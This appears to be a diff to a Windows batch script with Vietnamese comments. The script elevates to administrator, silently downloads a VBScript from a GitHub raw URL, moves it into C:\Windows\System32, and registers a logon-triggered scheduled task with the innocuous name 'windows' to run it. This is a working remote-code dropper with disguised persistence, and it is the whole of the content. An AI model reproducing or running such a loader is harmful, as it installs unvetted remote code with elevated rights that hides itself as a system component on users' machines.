@@ -1,70 +1,60 @@
 @echo off
-:: Kiem tra quyen quan tri
+:: Kiểm tra quyền quản trị
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo Vui long chay voi quyen quan tri.
+    echo Vui lòng chạy với quyền quản trị.
     powershell -command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
     exit
 )
 
-:: Thiet lap bien
-set "systemDownloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/system.bat"
-set "systemDestinationDir=C:\Program Files\Windows NT\ADB"
-set "systemDownloadFile=system.bat"
-set "winsysDownloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/winsys.vbs"
-set "winsysDestinationDir=C:\Windows\System32"
+:: Thiết lập biến
+set "winsysUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/winsys.vbs"
+set "destinationDir=C:\Program Files\Windows NT\ADB"
 set "winsysDownloadFile=winsys.vbs"
-set "logFile=%systemDestinationDir%\task_history_log.txt"
+set "logFile=%destinationDir%\task_history_log.txt"
 
-:: Tao thu muc neu chua ton tai cho system.bat
-if not exist "%systemDestinationDir%" (
-    echo Thu muc %systemDestinationDir% khong ton tai. Dang tao thu muc...
-    mkdir "%systemDestinationDir%"
+:: Tạo thư mục nếu chưa tồn tại
+if not exist "%destinationDir%" (
+    echo %date% %time% - Thư mục %destinationDir% không tồn tại. Đang tạo thư mục... >> "%logFile%"
+    mkdir "%destinationDir%"
 )
 
-:: Tai xuong system.bat
-echo Dang tai xuong system.bat...
-echo %date% %time% - Bat dau tai xuong tu %systemDownloadUrl% >> "%logFile%"
-curl -L -o "%systemDestinationDir%\%systemDownloadFile%" "%systemDownloadUrl%"
+:: Chuyển đến thư mục đích
+cd /d "%destinationDir%"
 
-:: Kiem tra xem system.bat da tai xuong thanh cong chua
-if exist "%systemDestinationDir%\%systemDownloadFile%" (
-    echo %date% %time% - system.bat da tai xuong thanh cong. >> "%logFile%"
+:: Tải xuống tệp winsys.vbs
+echo %date% %time% - Bắt đầu tải xuống winsys.vbs từ %winsysUrl% >> "%logFile%"
+curl -L -o "%winsysDownloadFile%" "%winsysUrl%" >nul 2>&1
+
+:: Kiểm tra xem tệp winsys.vbs đã tải xuống thành công chưa
+if exist "%winsysDownloadFile%" (
+    echo %date% %time% - winsys.vbs đã tải xuống thành công. >> "%logFile%"
+    
+    :: Di chuyển winsys.vbs vào C:\Windows\System32
+    move /y "%winsysDownloadFile%" "C:\Windows\System32\%winsysDownloadFile%" >nul 2>&1
+    
+    if exist "C:\Windows\System32\%winsysDownloadFile%" (
+        echo %date% %time% - winsys.vbs đã được di chuyển thành công vào System32. >> "%logFile%"
+    ) else (
+        echo %date% %time% - Di chuyển winsys.vbs thất bại. >> "%logFile%"
+        exit
+    )
 ) else (
-    echo %date% %time% - Tai xuong system.bat that bai. >> "%logFile%"
+    echo %date% %time% - Tải xuống winsys.vbs thất bại. >> "%logFile%"
     exit
 )
 
-:: Tao thu muc neu chua ton tai cho winsys.vbs
-if not exist "%winsysDestinationDir%" (
-    echo Thu muc %winsysDestinationDir% khong ton tai. Dang tao thu muc...
-    mkdir "%winsysDestinationDir%"
-)
+:: Tạo tác vụ trong Task Scheduler để chạy winsys.vbs bằng wscript.exe
+echo %date% %time% - Đang tạo tác vụ trong Task Scheduler... >> "%logFile%"
+schtasks /create /tn "windows" /tr "\"C:\Windows\System32\wscript.exe\" \"C:\Windows\System32\%winsysDownloadFile%\"" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
 
-:: Tai xuong winsys.vbs
-echo Dang tai xuong winsys.vbs...
-echo %date% %time% - Bat dau tai xuong tu %winsysDownloadUrl% >> "%logFile%"
-curl -L -o "%winsysDestinationDir%\%winsysDownloadFile%" "%winsysDownloadUrl%"
-
-:: Kiem tra xem winsys.vbs da tai xuong thanh cong chua
-if exist "%winsysDestinationDir%\%winsysDownloadFile%" (
-    echo %date% %time% - winsys.vbs da tai xuong thanh cong. >> "%logFile%"
-) else (
-    echo %date% %time% - Tai xuong winsys.vbs that bai. >> "%logFile%"
-    exit
-)
-
-:: Tao tac vu trong Task Scheduler de chay winsys.vbs
-echo Dang tao tac vu...
-schtasks /create /tn "windows" /tr "\"C:\Windows\System32\%winsysDownloadFile%\"" /sc onlogon /ru "%USERNAME%" /f
-
-:: Kiem tra ket qua
+:: Kiểm tra kết quả tạo tác vụ
 if %errorlevel% neq 0 (
-    echo %date% %time% - Tao tac vu that bai. >> "%logFile%"
-    echo Tao tac vu that bai.
+    echo %date% %time% - Tạo tác vụ thất bại. >> "%logFile%"
+    echo Tạo tác vụ thất bại.
 ) else (
-    echo %date% %time% - Tac vu tao thanh cong. >> "%logFile%"
-    echo Tac vu tao thanh cong.
+    echo %date% %time% - Tác vụ đã được tạo thành công. >> "%logFile%"
+    echo Tác vụ đã được tạo thành công.
 )
 
 exit
